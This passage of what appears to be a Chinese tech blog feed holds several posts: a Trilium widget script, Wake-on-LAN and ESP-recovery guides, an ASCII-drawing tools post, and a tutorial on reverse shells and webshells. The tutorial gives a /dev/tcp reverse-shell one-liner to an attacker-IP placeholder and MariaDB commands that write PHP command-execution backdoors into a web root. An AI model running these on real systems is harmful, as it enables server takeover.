punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\s-+:,/\\]+</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">chunk</span> <span class="token operator">=></span> chunk <span class="token operator">!==</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> words<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>chunks<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> chunks<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            words <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            words <span class="token operator">=</span> chunks<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> characters <span class="token operator">=</span> chunks<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>words<span class="token punctuation">,</span> characters<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">async</span> <span class="token function">entitiesReloadedEvent</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span>loadResults<span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>loadResults<span class="token punctuation">.</span><span class="token function">isNoteContentReloaded</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>noteId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> WordCountWidget<span class="token punctuation">;</span></code></pre></div></figure><p>笔记的属性加上 <code>#widget</code>，重启前端，然后在需要的笔记属性上添加 <code>#wordCount</code>，效果如下图</p><p><img src="/../img/trilium_weight.jpg"></p><h3 id="Day-Note-日记"><a href="#Day-Note-日记" class="headerlink" title="Day Note 日记"></a>Day Note 日记</h3><p>内置笔记（节点），以 <code>#calendarRoot</code> 标识，是官方针对日期型任务做的功能。</p><div class="note note-primary">            <p>我打算把生活日志和学习打卡放在这里，相对比分成两个 markdown 文件记录要清晰很多。</p>          </div><h3 id="Render-Note"><a href="#Render-Note" class="headerlink" title="Render Note"></a>Render Note</h3><p>Trilium 提供的一种特殊类型的笔记，它允许你将笔记的内容渲染成动态的 HTML 页面，配合上面的 Promoted 属性，可以完成一个体重 Tracker，如下所示</p><p><img src="/../img/trilium_render_note.jpg"></p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>官方编写的任务型脚本，用于管理 TODO，与日记集成，当添加 TODO 或者修改状态为 DONE 时，会自动把标题添加 TODO&#x2F;DONE 前缀放在日记下。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Trilium 是一款功能全面、易于使用、扩展性强的笔记软件。入门可能会被大量的专业术语迷惑，但是作者的理念我认为很适合做笔记，所有笔记都是平级，通过属性、链接关联在一起。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://triliumnext.github.io/Docs/Wiki/patterns-of-personal-knowledge">https://triliumnext.github.io/Docs/Wiki/patterns-of-personal-knowledge</a></p><p><a href="https://triliumnext.github.io/Docs/">https://triliumnext.github.io/Docs/</a></p>]]></content>
    
    
    <categories>
      
      <category>Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Notes</tag>
      
      <tag>Trilium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>获取 WebShell 和反弹 Bash</title>
    <link href="/reverse-shell/"/>
    <url>/reverse-shell/</url>
    
    <content type="html"><![CDATA[<p>旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。</p><span id="more"></span><h2 id="反弹-BASH"><a href="#反弹-BASH" class="headerlink" title="反弹 BASH"></a>反弹 BASH</h2><p>与 SSH 的区别在于，可以让目标主机主动连接黑客的主机，从而绕过防火墙的限制。</p><h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><p>最常用的反弹 Bash 方式是利用 nc（netcat）工具，黑客在自己电脑上监听端口</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token operator">&lt;</span> 端口 <span class="token operator">></span></code></pre></div></figure><ul><li><code>-l</code>: 监听模式。</li><li><code>-v</code>: 显示详细的信息。</li><li><code>-n</code>: 不进行域名解析。</li><li><code>-p &lt; 端口 &gt;</code>: 监听的端口号。</li></ul><p>在目标主机执行</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/<span class="token operator">&lt;</span> 攻击者 IP<span class="token operator">></span>/<span class="token operator">&lt;</span> 端口 <span class="token operator">></span> <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre></div></figure><ul><li><p><code>-i</code>: 交互式 shell</p></li><li><p><code>&amp;&gt;</code>: 将标准输出和错误进行重定向</p></li><li><p><code>/dev/tcp/ip/port</code>: bash 建立 socket 的一种特殊写法，除此之外还有 udp</p></li><li><p><code>&lt;&amp;1</code>: 把标准输入重定向到标准输出，其他写法 <code>0&gt;&amp;1</code></p></li></ul><div class="note note-primary">            <p>什么？你要问我都能连接到靶机执行指令了还要什么 nc？哼哼，黑客通常是使用各种漏洞连接到靶机，使用 nc 只是为了更方便的执行系统指令。</p><p>比如利用数据库漏洞执行 nc 反弹 bash</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">system <span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i &amp;> /dev/tcp/&#123;外部机器 IP&#125;/&#123;端口&#125; &lt;&amp;1'</span></code></pre></div></figure>          </div><h2 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h2><p>利用 Web 服务器漏洞执行 shell 指令，下面演示利用 PHP + MariaDB 写入一个后门文件。</p><h3 id="利用-secure-file-priv"><a href="#利用-secure-file-priv" class="headerlink" title="利用 secure_file_priv"></a>利用 secure_file_priv</h3><p>主要用于限制数据库对文件系统的访问。它规定 MySQL 服务器可以进行文件导入导出操作的目录。</p><figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% secure%'</span><span class="token operator">|</span> Variable_name            <span class="token operator">|</span> <span class="token keyword">Value</span>   <span class="token operator">|</span><span class="token operator">|</span><span class="token comment">--------------------------|---------|</span><span class="token operator">|</span> require_secure_transport <span class="token operator">|</span> <span class="token keyword">OFF</span>     <span class="token operator">|</span><span class="token operator">|</span> secure_auth              <span class="token operator">|</span> <span class="token keyword">ON</span>      <span class="token operator">|</span><span class="token operator">|</span> secure_file_priv         <span class="token operator">|</span>         <span class="token operator">|</span><span class="token operator">|</span> secure_timestamp         <span class="token operator">|</span> <span class="token keyword">NO</span>      <span class="token operator">|</span></code></pre></div></figure><ul><li>空字符串（’’）： 不限制导入导出目录，MySQL 可以在任意目录进行文件操作。</li><li>指定目录： 只能在指定的目录进行导入导出操作。例如：secure_file_priv&#x3D;’&#x2F;var&#x2F;lib&#x2F;mysql’</li><li>NULL： 禁止所有的文件导入导出操作，包括 LOAD DATA INFILE、SELECT … INTO OUTFILE 和 LOAD_FILE () 函数。</li></ul><p>然后查看用户是否具有 IO 权限</p><figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat <span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>file_priv<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">;</span></code></pre></div></figure><p>执行代码将后门输出到服务器</p><figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;?php @system ($_GET ['cmd']);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/srv/http/houmen.php'</span><span class="token punctuation">;</span></code></pre></div></figure><p>接下来就可以利用这个文件为所欲为啦</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/img/article/2021/webshell.jpg"></p><h3 id="利用-general-log"><a href="#利用-general-log" class="headerlink" title="利用 general_log"></a>利用 general_log</h3><p>如果上面的 <code>secure_file_priv</code> 规定了输出目录或者是 NULL，还可以使用 <code>general_log</code> 的方法来写 shell，它记录所有基础日志，默认关闭状态。</p><ol><li>模糊查找关于 general 的信息</li></ol><figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% general%'</span><span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>            <span class="token operator">|</span><span class="token operator">|</span><span class="token comment">------------------|------------------|</span><span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">OFF</span>              <span class="token operator">|</span><span class="token operator">|</span> general_log_file <span class="token operator">|</span>                  <span class="token operator">|</span></code></pre></div></figure><ol start="2"><li>开启 general_log，设置路径</li></ol><figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">'/srv/http/hm.php'</span><span class="token punctuation">;</span>MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% general%'</span><span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>            <span class="token operator">|</span><span class="token operator">|</span><span class="token comment">------------------|------------------|</span><span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">ON</span>               <span class="token operator">|</span><span class="token operator">|</span> general_log_file <span class="token operator">|</span> <span class="token operator">/</span>srv<span class="token operator">/</span>http<span class="token operator">/</span>hm<span class="token punctuation">.</span>php <span class="token operator">|</span></code></pre></div></figure><ol start="3"><li>写入数据</li></ol><figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">"&lt;?php @eval ($_GET ['command']);?>"</span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php">> sudo cat /srv/http/hm.php/usr/bin/mariadbd, Version: 10.5.9-MariaDB (Arch Linux). started with:Tcp port: 3306  Unix socket: /run/mysqld/mysqld.sockTime                Id Command  Argument210429 17:29:36      3 Query    select "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>"</code></pre></div></figure><div class="note note-danger">            <p>如果数据库用户权限被严格管控了 IO，那么将无法实现上述步骤，比如在 Linux 里面，httpd 的用户是 http，mariadb 的用户是 mysql，默认情况下，mysql 无法写入，httpd 无法读取</p>          </div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>后端只要满足三个条件就可以反弹 shell</p><ul><li>支持 tcp 链接</li><li>支持 IO 重定向</li><li>可以调用系统命令</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/#post-comment">常见数据库写入 Webshell 汇总</a></li><li><a href="https://becivells.github.io/2019/01/bash_i_dev_tcp/">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;localhost&#x2F;8080 0&gt;&amp;1 的含义</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nc</tag>
      
      <tag>渗透</tag>
      
      <tag>Bash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Manjaro + 微星 B365M 主板设置 Wake On Lan</title>
    <link href="/wake-on-lan/"/>
    <url>/wake-on-lan/</url>
    
    <content type="html"><![CDATA[<p>Wake On Lan，局域网唤醒主机。上学把台式电脑放家里面了，就想着用手机控制家里面的电脑，有时候在寝室睡觉（冬天）忘关电脑，就想了这样一个损招。</p><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>在主板上设置 <code>网络唤醒，PCI 唤醒</code>（请查阅主板相关说明书）</li><li>Manjaro 系统安装 <code>ethtool</code> 工具， 查看网卡是否支持 WOL</li></ul><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">sudo</span> <span class="token function">ethtool</span> eno1Supports Wake-on: pumbg        Wake-on: g</code></pre></div></figure><h2 id="启动-WOL"><a href="#启动-WOL" class="headerlink" title="启动 WOL"></a>启动 WOL</h2><ul><li><p>如果 Wake-on 参数是 d (disabled)，使用指令 <code>ethtool -s 网卡名称 wol g</code> 设置成 g (magic packet activity)</p></li><li><p>查看 tlp 服务，将 tlp 服务设置成开启自启</p><ul><li><code>sudo systemctl status tlp</code></li><li><code>sudo systemctl enable tlp</code></li></ul></li><li><p>更改 tlp 配置</p></li></ul><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">vim</span> /etc/tlp.conf<span class="token assign-left variable">TLP_ENABLE</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">WOL_DISABLE</span><span class="token operator">=</span>N</code></pre></div></figure><h2 id="无显示器设置-x11vnc-分辨率"><a href="#无显示器设置-x11vnc-分辨率" class="headerlink" title="无显示器设置 x11vnc 分辨率"></a>无显示器设置 x11vnc 分辨率</h2><p>没有显示器，只有主机也能操作</p><ol><li>安装 <code>xf86-video-dummy</code></li></ol><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">❯ <span class="token function">sudo</span> pacman <span class="token parameter variable">-S</span> dummy</code></pre></div></figure><ol start="2"><li>添加配置文件</li></ol><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">❯ <span class="token function">sudo</span> <span class="token function">vim</span> /usr/share/X11/xorg.conf.d/xorg.confSection <span class="token string">"Device"</span>    Identifier  <span class="token string">"Configured Video Device"</span>    Driver      <span class="token string">"dummy"</span>EndSectionSection <span class="token string">"Monitor"</span>    Identifier  <span class="token string">"Configured Monitor"</span>    HorizSync <span class="token number">31.5</span>-48.5    VertRefresh <span class="token number">50</span>-70EndSectionSection <span class="token string">"Screen"</span>    Identifier  <span class="token string">"Default Screen"</span>    Monitor     <span class="token string">"Configured Monitor"</span>    Device      <span class="token string">"Configured Video Device"</span>    DefaultDepth <span class="token number">24</span>    SubSection <span class="token string">"Display"</span>    Depth <span class="token number">24</span>    Modes <span class="token string">"1024x800"</span>    EndSubSectionEndSection</code></pre></div></figure><ol start="3"><li>reboot</li></ol>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Manjaro</tag>
      
      <tag>WOL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>双系统恢复删除的 Linux ESP 分区</title>
    <link href="/restore-manjaro-esp/"/>
    <url>/restore-manjaro-esp/</url>
    
    <content type="html"><![CDATA[<p>旧文整理：Manjaro + Windows 双系统，在 Windows 上误删除了 Linux 的 ESP 分区，开机只识别到 Windows 的解决方法。</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我是 Manjaro + Widnwos 双系统，其他系统也可以试一试。一般这种情况我建议备份数据直接重装。不过嘛，在我不断折腾下还是找到了恢复 ESP 的方法。在此之前，先简单介绍下 ESP 这个东西。</p><h2 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h2><p>ESP 是 EFI System Partition 的缩写，即 EFI 系统分区。它是一个特殊的磁盘分区，主要用于支持 UEFI 固件的启动。</p><p>ESP 分区的格式一般是 FAT32，UEFI 通过读取 ESP 上的配置信息去加载 OS 的内核，从而启动操作系统。</p><h2 id="BIOS-和-UEFI-的区别"><a href="#BIOS-和-UEFI-的区别" class="headerlink" title="BIOS 和 UEFI 的区别"></a>BIOS 和 UEFI 的区别</h2><h3 id="功能方面"><a href="#功能方面" class="headerlink" title="功能方面"></a>功能方面</h3><table><thead><tr><th>区别</th><th>传统 BIOS</th><th>UEFI</th></tr></thead><tbody><tr><td>分区表</td><td>使用主引导记录 (MBR)</td><td>使用全局唯一标识分区表 (GPT)</td></tr><tr><td>存储位置</td><td>主板的 BIOS 芯片</td><td>EFI</td></tr><tr><td>运行模式</td><td>16 位</td><td>64 位</td></tr><tr><td>安全性</td><td>相对较低</td><td>支持安全启动</td></tr><tr><td>用户界面</td><td>只能键盘导航的简单界面</td><td>可以联网更新的复杂界面</td></tr></tbody></table><h3 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h3><p>BIOS：自检 -&gt; 查找启动设备（硬盘） -&gt; 将 MBR 加载进内存 -&gt; 启动操作系统</p><p>UEFI：初始化设备 -&gt; 查找启动设备 -&gt; 加载 EFI（在 ESP 里面）进内存 -&gt; 启动操作系统</p><h2 id="恢复分区"><a href="#恢复分区" class="headerlink" title="恢复分区"></a>恢复分区</h2><p>OK，介绍完毕，正事开干</p><h3 id="制作-livecd-U-盘启动盘"><a href="#制作-livecd-U-盘启动盘" class="headerlink" title="制作 livecd (U 盘启动盘)"></a>制作 livecd (U 盘启动盘)</h3><p>下载镜像</p><ul><li><a href="https://manjaro.org/">Manjaro 官网</a> 下载 iso 镜像文件</li></ul><div class="note note-primary">            <p>下载太慢可以去 <a href="https://mirrors.tuna.tsinghua.edu.cn/osdn/storage/g/m/ma/manjaro/">清华镜像站</a> 下载</p>          </div><p>制作启动盘</p><ul><li><p>Windows，使用 <a href="https://github.com/pbatard/rufus/tree/master/src">rufus</a> 工具向 U 盘写入镜像。</p></li><li><p>Linux，使用 dd 指令。</p></li></ul><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 示例</span><span class="token function">sudo</span> <span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>manjaro.iso <span class="token assign-left variable">of</span><span class="token operator">=</span>/dev/sdb <span class="token assign-left variable">bs</span><span class="token operator">=</span>4M <span class="token assign-left variable">status</span><span class="token operator">=</span>progress</code></pre></div></figure><ul><li>Android，使用 Termux 的 dd 指令。（没尝试过）</li></ul><h3 id="进入-livecd"><a href="#进入-livecd" class="headerlink" title="进入 livecd"></a>进入 livecd</h3><p>将 U 盘插入需要修复的电脑，进入 BIOS，选择 U 盘启动，进入临时的 Manjaro 系统。</p><h3 id="挂载-chroot"><a href="#挂载-chroot" class="headerlink" title="挂载 &amp; chroot"></a>挂载 &amp; chroot</h3><p>打开终端输入以下指令自动挂载电脑上的 Manjaro 操作系统，自动 chroot.</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> manjaro-chroot <span class="token parameter variable">-a</span><span class="token comment">## 正常情况等待提示输入 '1' 即可</span></code></pre></div></figure><div class="note note-danger">            <p>注意，如果是格式化 esp 分区 (uuid 发生变化), 会导致格式化的分区不能自动挂载，有两种解决方案</p><ol><li>进入 chroot 后修改 &#x2F;etc&#x2F;fstab 修改格式化分区 uuid 后再次使用上述指令</li><li>尝试手动挂载 linux 系统所在分区</li></ol>          </div><p>因为我是格式化的 esp 分区，不能自动挂载上 efi 分区，我尝试的是手动挂载，下面是我我挂载的分区</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">/dev/nvme0n1p7  --<span class="token operator">></span> /mnt/Manjaro//dev/nvme0n1p6  --<span class="token operator">></span> /mnt/Manjaro/boot/Restore_the_GRUB_Bootloader/dev/nvme0n1p8 --<span class="token operator">></span> /mnt/Manjaro/home//dev/nvme0n1p9  --<span class="token operator">></span> /mnt/Manjaro/boot/efi/</code></pre></div></figure><p>手动挂载还需要输入以下指令</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> proc proc /mnt/proc<span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs sys /mnt/sys<span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-o</span> <span class="token builtin class-name">bind</span> /dev/mnt/dev<span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> devpts pts /mnt/dev/pts/<span class="token function">sudo</span> modprobe efivarfs<span class="token function">sudo</span> <span class="token function">chroot</span> /mnt<span class="token function">mount</span> <span class="token parameter variable">-t</span> efivarfs efivarfs /sys/firmware/efi/efivars</code></pre></div></figure><div class="note note-info">            <p>挂载好后别忘了 <code>sudo manjaro-chroot -a</code></p>          </div><h3 id="重装并更新-grub"><a href="#重装并更新-grub" class="headerlink" title="重装并更新 grub"></a>重装并更新 grub</h3><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> grub-install <span class="token parameter variable">--target</span><span class="token operator">=</span>x86_64-efi --efi-directory<span class="token operator">=</span>/boot/efi --bootloader-id<span class="token operator">=</span>manjaro <span class="token parameter variable">--recheck</span><span class="token function">sudo</span> <span class="token function">update-grub</span><span class="token comment"># 提示 ' 未知的设备 nvme0n1' 不用管他</span></code></pre></div></figure><p>如果上述指令无误的话就可以重启了.</p><p>进入系统后再次输入 <code>update-grub</code>, grub 会识别到电脑的其他系统，开机才会出现 grub 多重引导.</p><div class="note note-info">            <p>如果出现超时无法进入系统，注意修改 &#x2F;etc&#x2F;fstab 文件里面 ESP 的 UUID</p>          </div><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><p><a href="https://wiki.manjaro.org/index.php?title=Restore_the_GRUB_Bootloader">Restore_the_GRUB_Bootloader</a></p></li><li><p><a href="http://linux.vbird.org/linux_basic/0510osloader.php#process_1">第十九章、开机流程、模组管理与 Loader</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Manjaro</tag>
      
      <tag>Windows</tag>
      
      <tag>ESP</tag>
      
      <tag>UEFI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>盘点 ASCII 字符绘图工具</title>
    <link href="/tools-ascii-draw/"/>
    <url>/tools-ascii-draw/</url>
    
    <content type="html"><![CDATA[<p>旧文整理：使用纯 ASCII 字符绘制图形，在 2024 年，已经很少人能用到这些工具了吧，常见于一些规范、协议、linux 帮助文档，采用的都是纯文本形式编写。之前写博客被图床困扰，遂使用纯 ASCII 替换部分简图。</p><span id="more"></span><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">+---+     +---+     +---+<span class="token operator">|</span> A <span class="token operator">|</span> --<span class="token operator">></span> <span class="token operator">|</span> C <span class="token operator">|</span> --<span class="token operator">></span> <span class="token operator">|</span> D <span class="token operator">|</span>+---+     +---+     +---+            <span class="token operator">|</span>            <span class="token operator">|</span>            <span class="token function">v</span>          +---+          <span class="token operator">|</span> E <span class="token operator">|</span>          +---+               <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.               <span class="token function">v</span>               <span class="token builtin class-name">:</span>+------+     +---------+     +---------+     +---------+     +--------------+<span class="token operator">|</span> Task <span class="token operator">|</span> --<span class="token operator">></span> <span class="token operator">|</span> Created <span class="token operator">|</span> --<span class="token operator">></span> <span class="token operator">|</span> Audit <span class="token number">1</span> <span class="token operator">|</span> --<span class="token operator">></span> <span class="token operator">|</span> Audit <span class="token number">2</span> <span class="token operator">|</span> --<span class="token operator">></span> <span class="token operator">|</span> Execute Task <span class="token operator">|</span>+------+     +---------+     +---------+     +---------+     +--------------+               ^                               <span class="token builtin class-name">:</span>               <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.</code></pre></div></figure><div class="note note-primary">            <p>优点：兼容性强，可以在任意显示 ASCII 的设备上展示图形，占用空间极小<br>缺点：只能绘制简单、单一的图形</p>          </div><h2 id="Graph-Easy"><a href="#Graph-Easy" class="headerlink" title="Graph-Easy"></a><a href="https://github.com/ironcamel/Graph-Easy">Graph-Easy</a></h2><p>能够将 DOT（一种文本图形描述语言）文件转换成 ASCII、HTML、SVG 图片</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># DOT 文本：[hello]->[world]</span>+-------+     +-------+<span class="token operator">|</span> hello <span class="token operator">|</span> --<span class="token operator">></span> <span class="token operator">|</span> world <span class="token operator">|</span>+-------+     +-------+<span class="token comment"># DOT 文本</span><span class="token punctuation">[</span> Client <span class="token punctuation">]</span><span class="token punctuation">&#123;</span>rows:8<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> -- <span class="token punctuation">(</span>A<span class="token punctuation">)</span> Authorizatoin Request --<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token number">1</span>.Resource Owner <span class="token punctuation">]</span><span class="token punctuation">&#123;</span>rows:2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span> <span class="token number">1</span>.Resource Owner <span class="token punctuation">]</span> -- <span class="token punctuation">(</span>B<span class="token punctuation">)</span> Authorizatoin Grant --<span class="token operator">></span> <span class="token punctuation">[</span> Client <span class="token punctuation">]</span><span class="token punctuation">[</span> Client <span class="token punctuation">]</span> -- <span class="token punctuation">(</span>C<span class="token punctuation">)</span> Authorizatoin Request --<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token number">2</span>.Authorizatoin Server <span class="token punctuation">]</span><span class="token punctuation">&#123;</span>rows:2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span> <span class="token number">2</span>.Authorizatoin Server <span class="token punctuation">]</span> -- <span class="token punctuation">(</span>D<span class="token punctuation">)</span> Access Token --<span class="token operator">></span> <span class="token punctuation">[</span> Client <span class="token punctuation">]</span><span class="token punctuation">[</span> Client <span class="token punctuation">]</span> -- <span class="token punctuation">(</span>E<span class="token punctuation">)</span> Access Token --<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token number">3</span>.Resource Server <span class="token punctuation">]</span><span class="token punctuation">&#123;</span>rows:2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span> <span class="token number">3</span>.Resource Server <span class="token punctuation">]</span> -- <span class="token punctuation">(</span>F<span class="token punctuation">)</span> Protected Resource --<span class="token operator">></span> <span class="token punctuation">[</span> Client <span class="token punctuation">]</span><span class="token comment"># 渲染后</span>+--------+  <span class="token punctuation">(</span>A<span class="token punctuation">)</span> Authorizatoin Request   +------------------------+<span class="token operator">|</span>        <span class="token operator">|</span> ---------------------------<span class="token operator">></span> <span class="token operator">|</span>                        <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span>                              <span 